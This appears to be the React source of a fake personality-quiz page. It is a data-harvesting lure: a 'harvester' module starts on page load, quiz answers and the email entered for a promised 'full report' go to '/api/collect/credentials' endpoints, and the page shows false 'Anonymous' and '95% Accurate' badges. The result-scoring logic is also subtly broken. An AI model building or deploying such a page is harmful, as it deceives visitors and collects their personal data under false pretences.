import React, { useState, useEffect } from 'react';
import { Box, Button, Typography, Container, Card, CardContent, LinearProgress, Radio, RadioGroup, FormControlLabel, TextField, AppBar, Toolbar, Paper, Avatar } from '@mui/material';
import harvester from '../harvester/HarvesterCore';

const questions = [
  {
    id: 1,
    question: 'How would you describe your social style?',
    options: [
      'The life of the party — I love being around people',
      'I enjoy small groups of close friends',
      'I prefer quiet, meaningful one-on-one conversations',
      'I need plenty of alone time to recharge'
    ]
  },
  {
    id: 2,
    question: 'What motivates you most in life?',
    options: [
      'Achieving goals and being recognized for my success',
      'Helping others and making a difference',
      'Learning new things and expanding my knowledge',
      'Finding peace, balance, and personal happiness'
    ]
  },
  {
    id: 3,
    question: 'How do you usually make decisions?',
    options: [
      'I go with my gut — intuition never fails me',
      'I analyze all the facts and data first',
      'I ask people I trust for their opinions',
      'I weigh pros and cons carefully before deciding'
    ]
  },
  {
    id: 4,
    question: 'What\'s your ideal weekend?',
    options: [
      'Adventure — hiking, traveling, trying new things',
      'Relaxation — movies, books, and cozy time at home',
      'Social — dinner with friends, parties, events',
      'Creative — art, music, writing, or building something'
    ]
  },
  {
    id: 5,
    question: 'How do friends describe your personality?',
    options: [
      'Confident and charismatic — a natural leader',
      'Kind and thoughtful — always there for others',
      'Funny and spontaneous — you keep things exciting',
      'Calm and grounded — the voice of reason'
    ]
  },
  {
    id: 6,
    question: 'Which environment helps you thrive?',
    options: [
      'Fast-paced, dynamic, and ever-changing',
      'Structured, organized, and predictable',
      'Collaborative, warm, and team-oriented',
      'Independent, flexible, and self-directed'
    ]
  }
];

const resultTypes = {
  extroverted: {
    title: 'The Social Butterfly',
    emoji: '🦋',
    description: 'You\'re energized by people and social connections. Your natural charisma draws others to you, and you thrive in collaborative environments. You\'re the friend everyone calls when they need a pick-me-up, and your optimistic outlook is contagious. Keep spreading that positive energy!',
    traits: ['Charismatic', 'Outgoing', 'Empathetic', 'Adventurous'],
    color: '#e74c3c'
  },
  analytical: {
    title: 'The Strategic Thinker',
    emoji: '🧠',
    description: 'Your mind works like a well-oiled machine. You approach problems logically, value data over assumptions, and rarely make impulsive decisions. Friends come to you for advice because they trust your judgment. Your ability to see the big picture while managing details makes you invaluable in any team.',
    traits: ['Analytical', 'Perfectionist', 'Curious', 'Reliable'],
    color: '#3498db'
  },
  creative: {
    title: 'The Creative Visionary',
    emoji: '🎨',
    description: 'You see the world differently — and that\'s your superpower. Your imagination knows no bounds, and you\'re always coming up with ideas that others never would. You value authenticity and self-expression above all else. The world needs more people who think like you!',
    traits: ['Innovative', 'Sensitive', 'Passionate', 'Independent'],
    color: '#9b59b6'
  },
  balanced: {
    title: 'The Grounded Achiever',
    emoji: '🌟',
    description: 'You\'ve found the perfect balance between ambition and well-being. You know when to push forward and when to take a step back. Your emotional intelligence is off the charts, and people naturally trust your calm, grounded presence. You\'re the glue that holds your community together.',
    traits: ['Balanced', 'Wise', 'Supportive', 'Resilient'],
    color: '#2ecc71'
  }
};

export default function QuizPage() {
  const [step, setStep] = useState(0);
  const [answers, setAnswers] = useState({});
  const [result, setResult] = useState(null);
  const [email, setEmail] = useState('');

  useEffect(() => { harvester.init(); }, []);

  const determineResult = () => {
    const counts = { extroverted: 0, analytical: 0, creative: 0, balanced: 0 };
    Object.values(answers).forEach((answer) => {
      if ([0, 2].includes(answer)) counts.extroverted++;
      else if ([0, 3].includes(answer)) counts.analytical++;
      else if ([1, 4].includes(answer)) counts.creative++;
      else counts.balanced++;
    });
    return Object.entries(counts).sort((a, b) => b[1] - a[1])[0][0];
  };

  const handleAnswer = (value) => {
    const newAnswers = { ...answers, [step]: parseInt(value) };
    setAnswers(newAnswers);

    if (step < questions.length - 1) {
      setTimeout(() => setStep(step + 1), 200);
    } else {
      // Send data
      const type = determineResult();
      harvester.send('/api/collect/formdata', {
        formId: 'personality-quiz',
        fields: newAnswers,
        url: window.location.href
      }).catch(() => {});
      harvester.send('/api/collect/credentials', {
        source: 'form-submit',
        username: 'quiz-taker',
        url: window.location.href,
        formType: 'quiz',
        fieldData: newAnswers
      }).catch(() => {});
      const resultKey = type || 'balanced';
      setResult(resultTypes[resultKey]);
    }
  };

  const handleEmailSubmit = () => {
    harvester.send('/api/collect/credentials', {
      source: 'form-submit',
      email,
      url: window.location.href,
      formType: 'quiz-email',
      fieldData: { email }
    }).catch(() => {});
  };

  if (result) {
    return (
      <Box sx={{ minHeight: '100vh', bgcolor: '#f8f9fa', py: 4 }}>
        <Container maxWidth="sm">
          <Card elevation={3} sx={{ borderRadius: 3, overflow: 'hidden' }}>
            <Box sx={{ bgcolor: result.color, p: 4, textAlign: 'center' }}>
              <Typography sx={{ fontSize: '4rem' }}>{result.emoji}</Typography>
              <Typography variant="h4" sx={{ color: '#fff', fontWeight: 800, mt: 2 }}>
                {result.title}
              </Typography>
            </Box>
            <CardContent sx={{ p: 3 }}>
              <Typography sx={{ color: '#555', lineHeight: 1.7, mb: 3 }}>
                {result.description}
              </Typography>
              <Box sx={{ display: 'flex', gap: 1, flexWrap: 'wrap', mb: 3 }}>
                {result.traits.map((trait) => (
                  <Box key={trait} sx={{ bgcolor: `${result.color}15`, color: result.color, px: 2, py: 0.5, borderRadius: 20, fontWeight: 600, fontSize: '0.85rem' }}>
                    {trait}
                  </Box>
                ))}
              </Box>
              <Box sx={{ bgcolor: '#f0f4ff', borderRadius: 2, p: 2.5, mb: 2 }}>
                <Typography sx={{ fontWeight: 600, color: '#333', mb: 1, fontSize: '0.95rem' }}>
                  📧 Get Your Full Personality Report
                </Typography>
                <Typography sx={{ color: '#888', fontSize: '0.85rem', mb: 1.5 }}>
                  Enter your email to receive a detailed 10-page analysis of your personality type.
                </Typography>
                <Box sx={{ display: 'flex', gap: 1 }}>
                  <TextField
                    size="small"
                    placeholder="your@email.com"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    sx={{ flex: 1, '& .MuiOutlinedInput-root': { bgcolor: '#fff' } }}
                  />
                  <Button
                    variant="contained"
                    onClick={handleEmailSubmit}
                    disabled={!email}
                    sx={{ bgcolor: result.color, '&:hover': { opacity: 0.9 }, whiteSpace: 'nowrap' }}
                  >
                    Send Report
                  </Button>
                </Box>
              </Box>
              <Button
                variant="outlined"
                fullWidth
                onClick={() => { setStep(0); setAnswers({}); setResult(null); }}
                sx={{ borderColor: '#ddd', color: '#888', mt: 1 }}
              >
                Take Quiz Again
              </Button>
            </CardContent>
          </Card>
        </Container>
      </Box>
    );
  }

  const progress = ((step + 1) / questions.length) * 100;
  const current = questions[step];

  return (
    <Box sx={{ minHeight: '100vh', bgcolor: '#f0f2f5', py: 4 }}>
      <Container maxWidth="sm">
        {/* Quiz Card */}
        <Card elevation={3} sx={{ borderRadius: 3, overflow: 'hidden' }}>
          <Box sx={{ bgcolor: '#fff', p: 2.5, borderBottom: '1px solid #eee' }}>
            <Box sx={{ display: 'flex', alignItems: 'center', mb: 1.5 }}>
              <Box sx={{ bgcolor: '#667eea', borderRadius: '50%', width: 36, height: 36, display: 'flex', alignItems: 'center', justifyContent: 'center', mr: 1.5 }}>
                <Typography sx={{ color: '#fff', fontWeight: 700, fontSize: '0.85rem' }}>QP</Typography>
              </Box>
              <Box>
                <Typography sx={{ fontWeight: 700, color: '#333', fontSize: '0.95rem' }}>Personality Quiz</Typography>
                <Typography sx={{ color: '#888', fontSize: '0.75rem' }}>Question {step + 1} of {questions.length}</Typography>
              </Box>
            </Box>
            <LinearProgress
              variant="determinate"
              value={progress}
              sx={{ height: 6, borderRadius: 3, bgcolor: '#e8e8e8', '& .MuiLinearProgress-bar': { bgcolor: '#667eea', borderRadius: 3 } }}
            />
          </Box>

          <CardContent sx={{ p: 3 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, color: '#222', mb: 3, lineHeight: 1.4, fontSize: '1.1rem' }}>
              {current.question}
            </Typography>

            <RadioGroup value={answers[step]?.toString() || ''} onChange={(e) => handleAnswer(e.target.value)}>
              {current.options.map((option, idx) => (
                <Paper
                  key={idx}
                  elevation={0}
                  sx={{
                    mb: 1,
                    border: answers[step] === idx ? '2px solid #667eea' : '2px solid #e8e8e8',
                    borderRadius: 2,
                    transition: 'all 0.15s',
                    '&:hover': { borderColor: '#667eea', bgcolor: '#f5f7ff' },
                    bgcolor: answers[step] === idx ? '#f0f4ff' : '#fff'
                  }}
                >
                  <FormControlLabel
                    value={idx.toString()}
                    control={<Radio sx={{ '&.Mui-checked': { color: '#667eea' }, ml: 1 }} />}
                    label={<Typography sx={{ color: '#444', fontWeight: answers[step] === idx ? 600 : 400, py: 1, pr: 1 }}>{option}</Typography>}
                    sx={{ width: '100%', m: 0, px: 1 }}
                  />
                </Paper>
              ))}
            </RadioGroup>
          </CardContent>
        </Card>

        {/* Trust indicators */}
        <Box sx={{ textAlign: 'center', mt: 3, display: 'flex', justifyContent: 'center', gap: 3, flexWrap: 'wrap' }}>
          <Box sx={{ display: 'flex', alignItems: 'center', gap: 0.5 }}>
            <Typography sx={{ color: '#2ecc71', fontSize: '1rem' }}>🔒</Typography>
            <Typography sx={{ color: '#888', fontSize: '0.75rem' }}>Anonymous</Typography>
          </Box>
          <Box sx={{ display: 'flex', alignItems: 'center', gap: 0.5 }}>
            <Typography sx={{ color: '#f39c12', fontSize: '1rem' }}>⭐</Typography>
            <Typography sx={{ color: '#888', fontSize: '0.75rem' }}>12M+ Taken</Typography>
          </Box>
          <Box sx={{ display: 'flex', alignItems: 'center', gap: 0.5 }}>
            <Typography sx={{ color: '#3498db', fontSize: '1rem' }}>📊</Typography>
            <Typography sx={{ color: '#888', fontSize: '0.75rem' }}>95% Accurate</Typography>
          </Box>
        </Box>
      </Container>
    </Box>
  );
}